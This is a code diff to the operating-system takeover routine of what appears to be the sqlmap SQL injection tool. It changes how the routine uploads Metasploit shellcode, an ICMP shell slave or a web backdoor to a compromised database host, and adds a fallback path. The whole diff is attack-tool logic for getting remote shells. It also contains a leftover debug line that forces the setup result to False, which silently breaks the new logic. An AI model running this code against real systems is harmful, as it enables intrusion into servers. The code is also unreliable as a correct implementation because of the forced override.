@@ -15,6 +15,7 @@ from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.enums import DBMS
 from lib.core.enums import OS
+from lib.core.exception import SqlmapFilePathException
 from lib.core.exception import SqlmapMissingDependence
 from lib.core.exception import SqlmapMissingMandatoryOptionException
 from lib.core.exception import SqlmapMissingPrivileges
@@ -86,6 +87,8 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
 
     def osPwn(self):
         goUdf = False
+        fallbackToWeb = False
+        setupSuccess = False
 
         self.checkDbmsOs()
 
@@ -152,10 +155,11 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                 self.sysUdfs.pop("sys_bineval")
 
+        self.getRemoteTempPath()
+
         if isStackingAvailable() or conf.direct:
             web = False
 
-            self.getRemoteTempPath()
             self.initEnv(web=web)
 
             if tunnel == 1:
@@ -184,30 +188,50 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
 
                 if goUdf:
                     exitfunc = "thread"
+                    setupSuccess = True
                 else:
                     exitfunc = "process"
 
                 self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
 
                 if not goUdf:
-                    self.uploadShellcodeexec()
+                    setupSuccess = self.uploadShellcodeexec(web=web)
 
-                if Backend.isOs(OS.WINDOWS) and conf.privEsc:
-                    if Backend.isDbms(DBMS.MYSQL):
-                        debugMsg = "by default MySQL on Windows runs as SYSTEM "
-                        debugMsg += "user, no need to privilege escalate"
-                        logger.debug(debugMsg)
+                    print "forcing setupSuccess to False"
+                    setupSuccess = False
+
+                    if setupSuccess is not True:
+                        if Backend.isDbms(DBMS.MYSQL):
+                            fallbackToWeb = True
+                        else:
+                            msg = "unable to mount the operating system takeover"
+                            raise SqlmapFilePathException(msg)
+
+                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
+                    debugMsg = "by default MySQL on Windows runs as SYSTEM "
+                    debugMsg += "user, no need to privilege escalate"
+                    logger.debug(debugMsg)
+
             elif tunnel == 2:
-                self.uploadIcmpshSlave(web=web)
-                self.icmpPwn()
+                setupSuccess = self.uploadIcmpshSlave(web=web)
 
-        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
+                if setupSuccess is not True:
+                    if Backend.isDbms(DBMS.MYSQL):
+                        fallbackToWeb = True
+                    else:
+                        msg = "unable to mount the operating system takeover"
+                        raise SqlmapFilePathException(msg)
+
+        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
             web = True
 
-            infoMsg = "going to use a web backdoor to establish the tunnel"
+            if fallbackToWeb:
+                infoMsg = "falling back to web backdoor to establish the tunnel"
+            else:
+                infoMsg = "going to use a web backdoor to establish the tunnel"
             logger.info(infoMsg)
 
-            self.initEnv(web=web)
+            self.initEnv(web=web, forceInit=fallbackToWeb)
 
             if self.webBackdoorUrl:
                 if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
@@ -220,22 +244,29 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     warnMsg += "back-end DBMS underlying system is not Windows"
                     logger.warn(warnMsg)
 
-                self.getRemoteTempPath()
-
                 if tunnel == 1:
                     self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
-                    self.uploadShellcodeexec(web=web)
-                elif tunnel == 2:
-                    self.uploadIcmpshSlave(web=web)
-                    self.icmpPwn()
-        else:
-            errMsg = "unable to prompt for an out-of-band session because "
-            errMsg += "stacked queries SQL injection is not supported"
-            raise SqlmapNotVulnerableException(errMsg)
+                    setupSuccess = self.uploadShellcodeexec(web=web)
 
-        if tunnel == 1:
-            if not web or (web and self.webBackdoorUrl is not None):
+                    if setupSuccess is not True:
+                        msg = "unable to mount the operating system takeover"
+                        raise SqlmapFilePathException(msg)
+
+                elif tunnel == 2:
+                    setupSuccess = self.uploadIcmpshSlave(web=web)
+
+                    if setupSuccess is not True:
+                        msg = "unable to mount the operating system takeover"
+                        raise SqlmapFilePathException(msg)
+
+        if setupSuccess:
+            if tunnel == 1:
                 self.pwn(goUdf)
+            elif tunnel == 2:
+                self.icmpPwn()
+        else:
+            errMsg = "unable to prompt for an out-of-band session"
+            raise SqlmapNotVulnerableException(errMsg)
 
         if not conf.cleanup:
             self.cleanup(web=web)
